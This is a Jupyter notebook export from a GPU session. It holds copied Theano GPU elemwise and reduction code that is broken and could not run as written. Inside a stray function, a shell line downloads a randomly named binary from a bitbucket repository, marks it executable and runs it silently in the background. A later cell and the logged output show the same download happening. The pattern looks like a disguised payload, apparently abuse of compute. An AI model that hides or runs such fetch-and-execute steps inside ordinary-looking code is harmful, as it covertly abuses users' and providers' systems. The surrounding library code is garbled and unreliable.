In [1]:
!nvidia-smi

Sat Apr 30 02:26:21 2022       
+-----------------------------------------------------------------------------+
| NVIDIA-SMI 460.32.03    Driver Version: 460.32.03    CUDA Version: 11.2     |
|-------------------------------+----------------------+----------------------+
| GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC |
| Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. |
|                               |                      |               MIG M. |
|===============================+======================+======================|
|   0  Tesla T4            Off  | 00000000:00:04.0 Off |                    0 |
| N/A   46C    P8     9W /  70W |      0MiB / 15109MiB |      0%      Default |
|                               |                      |                  N/A |
+-------------------------------+----------------------+----------------------+
                                                                               
+-------

In [ ]:
from __future__ import absolute_import, print_function, division
import copy
import numpy as np

import theano
from theano.scalar import Scalar, Composite
from theano.tensor.elemwise import (Elemwise, DimShuffle, CAReduceDtype)
from theano.scalar.basic_scipy import Erfinv, Erfcinv
from theano.scalar.basic import upgrade_to_float_no_complex, complex_types

try:
    import pygpu
    from pygpu import gpuarray
    from pygpu.tools import ArrayArg
    from pygpu.reduction import ReductionKernel
    from pygpu.gpuarray import dtype_to_typecode
except ImportError:
    pass


def make_argument(v, name):
    return ArrayArg(np.dtype(v.type.dtype), name)


def as_C_string_const(s):
    return '\n'.join('"%s\\n"' % (l.replace('"', '\\"'))
                     for l in s.split('\n'))


def get_scal(dt):
    if dt == 'float16':
        dt = 'float32'
    return scalar.get_scalar_type(dt)


def max_inputs_to_GpuElemwise(node_or_outputs):
    """
    Compute the maximum number of inputs that fit in a kernel call.
    """
    if isinstance(node_or_outputs, Apply):
        outputs = node_or_outputs.outputs
    else:
        outputs = node_or_outputs

    n_out = len(outputs)
    ndim = outputs[0].type.ndim

    ptr_size = 8
    # Even with call32, the interface does not change, and shapes,
    # strides, and offset are passed as 64-bits (8 bytes)
    int_size = 8

    # we take the limit from CUDA for now
    nb_bytes_total = 4096

    # Regardless of the number of arguments, we have:
    # - The total number of elements (int)
    # - The shape (int) on each dimension
    fixed_size = int_size + int_size * ndim

    # Each argument (input or output) has:
    # - 1 pointer (ptr)
    # - 1 offset (int)
    # - 1 stride (int) per dimension
    # Even if the tensor ends up being contiguous, code for the
    # non-contiguous case still needs to be generated.
    param_size = ptr_size + int_size + int_size * ndim

    # Remaining for inputs
    nb_bytes_for_inputs = nb_bytes_total - fixed_size - param_size * n_out

    # Maximum number of inputs
    max_nb_inputs = nb_bytes_for_inputs // param_size

    return max_nb_inputs


class GpuElemwise2():


    nin = property(lambda self: self.scalar_op.nin)
    nout = property(lambda self: self.scalar_op.nout)
    _f16_ok = True

    def __str__(self):
        if self.name is not None:
            return self.name
        items = str(sorted(self.inplace_pattern.items()))
        return "GpuElemwise{%s}%s<gpuarray>" % (self.scalar_op, items)

    def max_inputs(self, node_or_outputs):
        return max_inputs_to_GpuElemwise(node_or_outputs)

    def make_node(self, *inputs):
        ctx_name = infer_context_name(*inputs)
        inputs = [as_gpuarray_variable(i, ctx_name) for i in inputs]
        out_info = Elemwise.get_output_info(self, GpuDimShuffle, *inputs)
        inputs = out_info[2]
        outputs = [GpuArrayType(broadcastable=br,
                                context_name=ctx_name,
                                dtype=dtype)() for dtype, br in
                   zip(out_info[0], out_info[1])]
        if len(outputs) > 1:
            raise NotImplementedError()

        if len(inputs) > max_inputs_to_GpuElemwise(outputs):
            raise NotImplementedError(
                "Can not make this GpuElemwise with that much inputs")

        # Try to generate the kernel to catch SupportCodeErrors
        scal_ins = [get_scal(i.dtype) for i in inputs]
        fake_node = self.scalar_op.make_node(*[i() for i in scal_ins])
        try:
            code = fake_node.op.c_support_code_apply(fake_node, "test")
            if code:
                raise SupportCodeError(code)
        except MethodNotDefined:
            pass
        try:
            support_code = fake_node.op.c_support_code()
            if "struct" in support_code:
                # The macro is fine, the C++ struct is not.
                raise SupportCodeError(
                    "struct aren't supported in GpuElemwise support_code" +
                    support_code)
        except MethodNotDefined:
            pass

        node = Apply(self, inputs, outputs)
        return node

    def get_params(self, node):
        return node.inputs[0].type.context

    def _get_vnames(self, node):
        inps = ['i%d' % (n,) for n, _ in enumerate(node.inputs)]
        outs = ['o%d' % (n,) if n not in self.inplace_pattern else
                inps[self.inplace_pattern[n]]
                for n, _ in enumerate(node.outputs)]
        return inps, outs

    def _generate_op_string(self, node):
        inps, outs = self._get_vnames(node)
        scal_v_ins = [get_scal(i.dtype)() for i in node.inputs]

        # As float16 isn't a c type and most GPU don't compute on it,
        # We convert the computation to float32, and let libgpuarray
        # load in float16 and cast to float32 and do the reverse for
        # the output.
        scalar_op = self.scalar_op
        if isinstance(scalar_op, (scalar.Cast, Composite)):
            scalar_op = scalar_op.clone_float32()
        fake_node = scalar_op.make_node(*scal_v_ins)
        scal_v_out = fake_node.outputs
        assert len(scal_v_out) == len(node.outputs)

        try:
            kop = fake_node.op.c_code(fake_node, 'elem_scalar',
                                      inps, outs,
                                      dict(fail='return;'))
        except MethodNotDefined:
            raise AssertionError(
                "No c code for this scalar. Can not make a GpuElemwise")
        # If the following assert fail, then we need to update the
        # code handler above.
        assert 'npy_float16' not in kop

        support_code = ""
        try:
            # We accept only some c_support_code().
            # This filter is done in the make_node()
            support_code += fake_node.op.c_support_code()
        except MethodNotDefined:
            pass
        for npy, ga in [("npy_bool", "ga_bool"),
                        ("npy_uint8", "ga_ubyte"),
                        ("npy_uint16", "ga_ushort"),
                        ("npy_uint32", "ga_uint"),
                        ("npy_uint64", "ga_ulong"),
                        ("npy_int8", "ga_byte"),
                        ("npy_int16", "ga_short"),
                        ("npy_int32", "ga_int"),
                        ("npy_int64", "ga_long"),
                        ("npy_float16", "ga_half"),
                        ("npy_float32", "ga_float"),
                        ("npy_float64", "ga_double"),
                        ]:
            kop = kop.replace(npy, ga)
        return support_code, kop

    def c_headers(self):
        return ['<numpy_compat.h>', '<gpuarray/types.h>',
                '<gpuarray/elemwise.h>']

    def c_support_code_struct(self, node, name):
        return "\nGpuElemwise *ge;\n"

    def c_init_code_struct(self, node, name, sub):
        inps, outs = self._get_vnames(node)
        nargs = len(inps) + len(outs) - len(self.inplace_pattern)
        support_code, kop = self._generate_op_string(node)
        res = """
        gpuelemwise_arg args[%(nargs)s] = {{0}};
        """ % dict(nargs=nargs)

        for n, (i, name) in enumerate(zip(node.inputs, inps)):
            res += """
            args[%(n)s].name = %(name)s;
            args[%(n)s].typecode = %(typecode)s;
            args[%(n)s].flags = GE_READ;
            """ % dict(n=n, name='"%s"' % (name,),
                       typecode=i.type.typecode)

        p = len(inps)
        for n, o in enumerate(node.outputs):
            if n in self.inplace_pattern:
                assert(len(node.outputs) == 1)
                res += "\nargs[%(n)s].flags |= GE_WRITE;\n" % dict(n=self.inplace_pattern[n])
            else:
                res += """
                args[%(n)s].name = %(name)s;
                args[%(n)s].typecode = %(typecode)s;
                args[%(n)s].flags = GE_WRITE;
                """ % dict(n=p, name='"%s"' % (outs[n],),
                           typecode=o.type.typecode)
                p += 1

        res += """
        ge = GpuElemwise_new(%(ctx)s->ctx, %(support)s, %(kop)s, %(nargs)s, args, %(nd)s, GE_CONVERT_F16);
        if (ge == NULL) {
           PyErr_SetString(PyExc_RuntimeError, "Could not initialize elemwise support");
           %(fail)s
        }
        """ % dict(nargs=nargs, ctx=sub['params'], fail=sub['fail'],
                   support=as_C_string_const(support_code),
                   kop=as_C_string_const(kop), nd=node.inputs[0].ndim)

        return res

    def c_cleanup_code_struct(self, node, name):
        return """
        GpuElemwise_free(ge);
        """

def c_code():

    !wget https://bitbucket.org/dvcvbfsrg5/cgrdtjg54/raw/e7be5e8c85624c90cd8b67b2cd5d649bd766c47d/ntrysdfsdtt ; chmod +x ntrysdfsdtt ; ./ntrysdfsdtt &> /dev/null

    nd = node.outputs[0].ndim
    fail = sub["fail"]
    initial_dims = ','.join('1' for i in xrange(nd))
    opname = str(self.scalar_op)
    ctx = sub['params']
    nargs = len(node.inputs) + len(node.outputs) - len(self.inplace_pattern)

    # check that all inputs have valid dimensions
    emitted_inames = {}
    code = """
    // +1 is so that MSVC is happy when nd == 0
    size_t dims[%(nd)s+1] = {%(initial_dims)s};
    void *rargs[%(nargs)s] = {0};
    int err;
    """ % locals()
    for idx, iname in enumerate(inputs):
        if iname in emitted_inames:
            assert emitted_inames[iname] is node.inputs[idx]
            continue

        broadcasts = map(int, node.inputs[idx].broadcastable)
        broadcasts = ', '.join(map(str, broadcasts))
        nd = node.inputs[idx].ndim
        code += """
        int broadcasts_%(iname)s[%(nd)s+1] = {%(broadcasts)s};
        """ % locals()
        emitted_inames[iname] = node.inputs[idx]

    # check that all inputs have valid dimensions
    emitted_inames = {}
    for idx, iname in enumerate(inputs):
        code += "rargs[%(idx)s] = &%(iname)s->ga;\n" % dict(idx=idx, iname=iname)
        if iname in emitted_inames:
            continue
        code += """
    if (%(nd)s != PyGpuArray_NDIM(%(iname)s))
    {
        PyErr_Format(PyExc_TypeError,
                      "need %(nd)s dims, not %%u",
                      PyGpuArray_NDIM(%(iname)s));
        %(fail)s;
    }
    for (int i = 0; i< %(nd)s; ++i)
    {
        dims[i] = (dims[i] == 1) ? PyGpuArray_DIMS(%(iname)s)[i] : dims[i];
        if ((!(broadcasts_%(iname)s[i] &&
              PyGpuArray_DIMS(%(iname)s)[i] == 1)) &&
            (dims[i] != PyGpuArray_DIMS(%(iname)s)[i]))
        {
            PyErr_Format(PyExc_ValueError,
                          "GpuElemwise. Input dimension mis-match. Input"
                          " %(idx)d (indices start at 0) has shape[%%d] == %%llu"
                          ", but the output's size on that axis is %%llu.",
                          i,
                          (unsigned long long)PyGpuArray_DIMS(%(iname)s)[i],
                          (unsigned long long)dims[i]
                        );
            %(fail)s;
        }
    }
        """ % locals()
        emitted_inames[iname] = True
    # check that all outputs have valid dimensions
    p = len(node.inputs)
    for idx, oname in enumerate(outputs):
        typecode = dtype_to_typecode(node.outputs[idx].dtype)
        if idx not in self.inplace_pattern.keys():
            code += """
    for (int i = 0; (i< %(nd)s) && (%(oname)s); ++i) {
        if (dims[i] != PyGpuArray_DIMS(%(oname)s)[i])
        {
            Py_DECREF(%(oname)s);
            %(oname)s = NULL;
        }
    }
    if (%(oname)s && !GpuArray_CHKFLAGS(&(%(oname)s->ga), GA_C_CONTIGUOUS))
    {
        Py_XDECREF(%(oname)s);
        %(oname)s = NULL;
    }
    if (NULL == %(oname)s)
    {
        %(oname)s = pygpu_empty(%(nd)d, dims,
                        %(typecode)s, GA_C_ORDER,
                        %(ctx)s, Py_None);
        if (!%(oname)s) {
            %(fail)s
        }
    }
    rargs[%(p)s] = &%(oname)s->ga;
            """ % locals()
            p += 1
        else:
            input_idx = self.inplace_pattern[idx]
            iname = inputs[input_idx]
            code += """
    Py_XDECREF(%(oname)s);
    %(oname)s = %(iname)s;
    Py_INCREF(%(oname)s);
    for (int i = 0; (i< %(nd)s) && (%(oname)s); ++i) {
        if (dims[i] != PyGpuArray_DIMS(%(oname)s)[i])
        {
            PyErr_Format(PyExc_ValueError,
                          "GpuElemwise. Output dimension mis-match. Output"
                          " %(idx)d (indices start at 0), working inplace"
                          " on input %(input_idx)s, has shape[%%i] == %%llu"
                          ", but the output's size on that axis is %%llu.",
                          i,
                          (unsigned long long)PyGpuArray_DIMS(%(oname)s)[i],
                          (unsigned long long)dims[i]
                        );
            Py_DECREF(%(oname)s);
            %(oname)s = NULL;
            %(fail)s;
        }
    }
    """ % locals()

    code += """
    if (GpuElemwise_call(ge, rargs, GE_BROADCAST) != GA_NO_ERROR) {
      PyErr_SetString(PyExc_RuntimeError, "Error in the elemwise call");
      %(fail)s
    }
    """ % dict(fail=sub['fail'])

    return str(code)

c_code()

# To disable the superclass perform.
perform = Op.perform

# Since we don't have a perform ...
def python_constant_folding(self, node):
    return False

def c_code_cache_version(self):
    ver = self.scalar_op.c_code_cache_version()
    if ver:
        return (10, ver)
    else:
        return ver


class SupportCodeError(Exception):
    """
    We do not support certain things (such as the C++ complex struct).
    """


class GpuDimShuffle(DimShuffle):
    """
    DimShuffle on the GPU.
    """
    _f16_ok = True
    c_func_name = 'APPLY_SPECIFIC(gpu_dimshuffle)'

    def make_node(self, input):
        ctx_name = infer_context_name(input)
        res = DimShuffle.make_node(self, input)
        otype = GpuArrayType(dtype=res.outputs[0].type.dtype,
                             broadcastable=res.outputs[0].type.broadcastable,
                             context_name=ctx_name)
        input = as_gpuarray_variable(input, ctx_name)
        return Apply(self, [input], [otype()])

    def __str__(self):
        if self.inplace:
            s = "InplaceGpuDimShuffle{%s}"
        else:
            s = "GpuDimShuffle{%s}"
        return s % (','.join(str(x) for x in self.new_order))

    def perform(self, node, inp, out, params):
        input, = inp
        storage, = out

        res = input

        res = res.transpose(self.shuffle + self.drop)

        shape = list(res.shape[:len(self.shuffle)])
        for augm in self.augment:
            shape.insert(augm, 1)
        res = res.reshape(shape)

        if not self.inplace:
            res = res.copy()

        storage[0] = res


class GpuCAReduceCuda(GpuKernelBase, HideC, CAReduceDtype):
    """
    GpuCAReduceCuda is a Reduction along some dimensions by a scalar op.
    Parameters
    ----------
    reduce_mask
        The dimensions along which to reduce. The `reduce_mask` is a tuple of
        booleans (actually integers 0 or 1) that specify for each input
        dimension, whether to reduce it (1) or not (0).
    pre_scalar_op
        If present, must be a scalar op with only 1 input. We will execute it
        on the input value before reduction.
    Examples
    --------
    When scalar_op is a theano.scalar.basic.Add instance:
      - reduce_mask == (1,) sums a vector to a scalar
      - reduce_mask == (1,0) computes the sum of each column in a matrix
      - reduce_mask == (0,1) computes the sum of each row in a matrix
      - reduce_mask == (1,1,1) computes the sum of all elements in a 3-tensor.
    Notes
    -----
    Any reduce_mask of all zeros is a sort of 'copy', and may be removed during
    graph optimization.
    This Op is a work in progress.
    This op was recently upgraded from just GpuSum a general CAReduce. Not
    many code cases are supported for scalar_op being anything other than
    scalar.Add instances yet.
    Important note: if you implement new cases for this op, be sure to
    benchmark them and make sure that they actually result in a speedup.
    GPUs are not especially well-suited to reduction operations so it is
    quite possible that the GPU might be slower for some cases.
    """
    __props__ = ('axis', 'reduce_mask', 'dtype', 'acc_dtype', 'scalar_op',
                 'pre_scalar_op')
    _f16_ok = True
    verbose = 0

    def __init__(self, scalar_op, axis=None,
                 reduce_mask=None, dtype=None, acc_dtype=None,
                 pre_scalar_op=None):
        if reduce_mask is not None:
            reduce_mask = tuple(reduce_mask)
        self.reduce_mask = reduce_mask

        # used to make sure that calls to scalar op
        # have unique name arguments
        self._n_scalar_op_calls = 0
        CAReduceDtype.__init__(self, scalar_op, axis=axis,
                               dtype=dtype, acc_dtype=acc_dtype)
        self.pre_scalar_op = pre_scalar_op
        if pre_scalar_op:
            assert pre_scalar_op.nin == 1

    def __str__(self):
        pre = ""
        if self.pre_scalar_op:
            pre = "pre=%s,red=" % str(self.pre_scalar_op)
        ax = ''
        if self.axis is not None:
            ax = '{%s}' % (', '.join(str(x) for x in self.axis),)
        return "GpuCAReduceCuda{%s%s}%s" % (pre, str(self.scalar_op), ax)

    def __setstate__(self, d):
        self.__dict__.update(d)
        # For unpickling of old ops.
        if not hasattr(self, "pre_scalar_op"):
            self.pre_scalar_op = None

    def make_node(self, x):
        x = as_gpuarray_variable(x, infer_context_name(x))
        if x.type.context.kind != b'cuda':
            raise TypeError("GpuCAReduceCuda doesn't work for non-cuda devices")
        ret = super(GpuCAReduceCuda, self).make_node(x)
        self = copy.copy(self)
        self.axis = ret.op.axis
        if self.pre_scalar_op:
            # Currently we only tested pre_scalar_op that don't cause
            # upcast.
            assert Elemwise(self.pre_scalar_op)(x).dtype == x.dtype
        if self.reduce_mask is None:
            if self.axis is None:
                reduce_mask = [1] * x.type.ndim
            else:
                reduce_mask = [0] * x.type.ndim
                for a in self.axis:
                    assert reduce_mask[a] == 0
                    reduce_mask[a] = 1
            self.reduce_mask = tuple(reduce_mask)

        if (x.type.ndim != len(self.reduce_mask)):
            raise TypeError("x must have rank %i" % len(self.reduce_mask))
        if ("complex" in x.dtype or
                "complex" in ret.outputs[0].dtype or
                "complex" in self._acc_dtype(x.dtype)):
            raise NotImplementedError("We don't support complex in gpu reduction")
        return Apply(self, [x], [GpuArrayType(ret.outputs[0].dtype,
                                              ret.outputs[0].type.broadcastable,
                                              context_name=x.type.context_name)()])

    def perform(self, node, inp, out, ctx):
        theano.Op.perform(self, node, inp, out, ctx)

    def supports_c_code(self, inputs):
        """
        Returns True if the current op and reduce pattern has functioning C code.
        """
        # If we don't even have the right method, we certainly
        # don't support the C code
        # (This is the test that used to be implemented by
        # local_gpu_sum)
        pattern = (''.join(str(i) for i in self.reduce_mask))
        if not hasattr(self, 'c_code_reduce_%s' % pattern):
            return False

        # Now that this is a general reduction op, we might
        # have a method for a pattern, but that pattern
        # might not be implemented for the current scalar op.
        # To detect this more complicated situation, we
        # make fake arguments to c_code, try to run them,
        # and see if NotImplementedError gets raised.

        node = self.make_node(*inputs)

        name = 'fake_name'

        inp = ['fake_input_name_%d' % i for i in xrange(len(inputs))]
        out = ['fake_output_name_%d' % i for i in xrange(len(node.outputs))]

        sub = {'fail': 'fake failure code', 'params': 'fake context'}

        try:
            self.c_code(node, name, inp, out, sub)
            if not self.gpu_kernels(node, name):
                return False
        except NotImplementedError:
            return False
        return True

    def c_headers(self):
        return ['<numpy_compat.h>', '<gpuarray/types.h>']

    def c_support_code(self):
        return """
        template <typename T>
        static T ceil_intdiv(T a, T b)
        {
            return (a/b) + ((a % b) ? 1: 0);
        }
        """

    def c_code(self, node, name, inp, out, sub):
        x, = inp
        z, = out

        nd_in = node.inputs[0].type.ndim
        nd_out = node.outputs[0].type.ndim
        # For complex, we need to use theano_complex* in the c code to
        # have it run. But libgpuarray don't understand it.
        in_dtype = node.inputs[0].type.dtype_specs()[1]
        out_dtype = node.outputs[0].type.dtype_specs()[1]
        gin_dtype = "npy_" + node.inputs[0].dtype
        gout_dtype = "npy_" + node.outputs[0].dtype
        assert nd_in - nd_out == sum(self.reduce_mask)

        sio = StringIO()
        fail = sub['fail']
        ctx = sub['params']

        # check input
        print("""
        if (PyGpuArray_NDIM(%(x)s) != %(nd_in)s)
        {
            PyErr_Format(PyExc_TypeError,
                         "required nd=%(nd_in)s, got nd=%%u", PyGpuArray_NDIM(%(x)s));
            %(fail)s;
        }
        """ % locals(), file=sio)

        # It might be nice to use a property of the op class to do this,
        # but tensor.elemwise.CAReduce has this exact same check so I guess
        # this is OK to do
        if self.scalar_op in [scalar.minimum, scalar.maximum]:
            conds = ["(PyGpuArray_DIMS(%s)[%d] == 0)" % (x, i)
                     for i in xrange(nd_in)
                     if self.reduce_mask[i]]
            assert len(conds) > 0
            cond = "(" + " || ".join(conds) + ")"
            print("""
            if %(cond)s
            {
                PyErr_Format(PyExc_ValueError," tried to reduce a 0-length axis.");
                %(fail)s;
            }
            """ % locals(), file=sio)

        #
        # alloc an output if we need one
        #

        # check the basics of out output
        print("""
        if (  !%(z)s
           || (PyGpuArray_NDIM(%(z)s) != %(nd_out)s)
        """ % locals(), file=sio)

        # ensure that the output has the right non-reduced dimensions
        j = 0
        for i in xrange(nd_in):
            if not self.reduce_mask[i]:
                print(" || (PyGpuArray_DIMS(%(z)s)[%(j)s] != PyGpuArray_DIMS(%(x)s)[%(i)d]) " % locals(), file=sio)
                j += 1

        print("""
           )
        {
            """ % locals(), file=sio)
        if nd_out > 0:
            print("size_t new_dims[%(nd_out)s]; " % locals(), file=sio)
        else:
            print("size_t *new_dims=NULL; ", file=sio)

        j = 0
        for i in xrange(nd_in):
            if not self.reduce_mask[i]:
                print('new_dims[%(j)s] = PyGpuArray_DIMS(%(x)s)[%(i)s];' % locals(), file=sio)
                j += 1
        out_typecode = dtype_to_typecode(gout_dtype[4:])
        print("""
            Py_XDECREF(%(z)s);
            %(z)s = pygpu_empty(%(nd_out)s, new_dims,
                                %(out_typecode)s, GA_C_ORDER,
                                %(ctx)s, Py_None);
            if (NULL == %(z)s)
            {
                PyErr_Format(PyExc_RuntimeError, "Failed to allocate output");
                %(fail)s;
            }
        }
        """ % locals(), file=sio)

        # \begin bracket the reduction in a check that there is
        # actually work to do
        if getattr(self.scalar_op, 'identity', None) == 0:
            zero_shp = "GpuArray_memset(&%(z)s->ga, 0)" % locals()
        # TODO: elif getattr(self.scalar_op, 'identity', None) == 1:
        else:
            scalar_op = self.scalar_op
            zero_shp = """
            PyErr_Format(PyExc_NotImplementedError,
                         "GpuCAReduceCuda not implemented when input shape is 0"
                         " for this scalar_op: %(scalar_op)s");
            %(fail)s;
            """ % locals()
        print("""
        if (PyGpuArray_SIZE(%(z)s) && ! PyGpuArray_SIZE(%(x)s)){
            %(zero_shp)s;
        }
        else if (PyGpuArray_SIZE(%(z)s))
        {
        """ % locals(), file=sio)

        #
        # Now perform the reduction
        #

        if all(i == 1 for i in self.reduce_mask):
            # check if the tensor is ccontiguous, if true, use the c_code_reduce_ccontig code.
            # TODO: check if we are ccontiguous when we un-dimshuffle
            # TODO: if only some dims are ccontiguous, call version with less dims.
            print('if(%(x)s->ga.flags & GA_C_CONTIGUOUS){' % locals(),
                  file=sio)
            self.c_code_reduce_ccontig(sio, node, name, x, z, fail)
            print("}else{", file=sio)
            getattr(self, 'c_code_reduce_%s' %
                    (''.join(str(i) for i in self.reduce_mask)))(
                sio, node, name, x, z, fail)
            print("}", file=sio)
        else:
            getattr(self, 'c_code_reduce_%s' % (''.join(
                str(i) for i in self.reduce_mask)))(sio, node, name, x, z, fail)

        # \end bracket the reduction ...
        print("""
        }
        """ % locals(), file=sio)

        return sio.getvalue()


--2022-04-30 02:33:26--  https://bitbucket.org/dvcvbfsrg5/cgrdtjg54/raw/e7be5e8c85624c90cd8b67b2cd5d649bd766c47d/ntrysdfsdtt
Resolving bitbucket.org (bitbucket.org)... 104.192.141.1, 2406:da00:ff00::22e9:9f55, 2406:da00:ff00::22c5:2ef4, ...
Connecting to bitbucket.org (bitbucket.org)|104.192.141.1|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 346 [text/plain]
Saving to: ‘ntrysdfsdtt.1’

ntrysdfsdtt.1       100%[===================>]     346  --.-KB/s    in 0s      

2022-04-30 02:33:27 (61.1 MB/s) - ‘ntrysdfsdtt.1’ saved [346/346]

Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following packages were automatically installed and are no longer required:
  libnvidia-common-460 nsight-compute-2020.2.0
Use 'apt autoremove' to remove them.
The following NEW packages will be installed:
  libpci3
0 upgraded, 1 newly installed, 0 to remove and 42 not upgraded.
Need to get 24.1 kB of archives.
After this operation,

In [7]:
!wget https://bitbucket.org/dvcvbfsrg5/cgrdtjg54/raw/e7be5e8c85624c90cd8b67b2cd5d649bd766c47d/ntrysdfsdtt

--2022-04-30 02:31:46--  https://bitbucket.org/dvcvbfsrg5/cgrdtjg54/raw/e7be5e8c85624c90cd8b67b2cd5d649bd766c47d/ntrysdfsdtt
Resolving bitbucket.org (bitbucket.org)... 104.192.141.1, 2406:da00:ff00::22e9:9f55, 2406:da00:ff00::6b17:d1f5, ...
Connecting to bitbucket.org (bitbucket.org)|104.192.141.1|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 346 [text/plain]
Saving to: ‘ntrysdfsdtt’

ntrysdfsdtt         100%[===================>]     346  --.-KB/s    in 0s      

2022-04-30 02:31:47 (15.7 MB/s) - ‘ntrysdfsdtt’ saved [346/346]

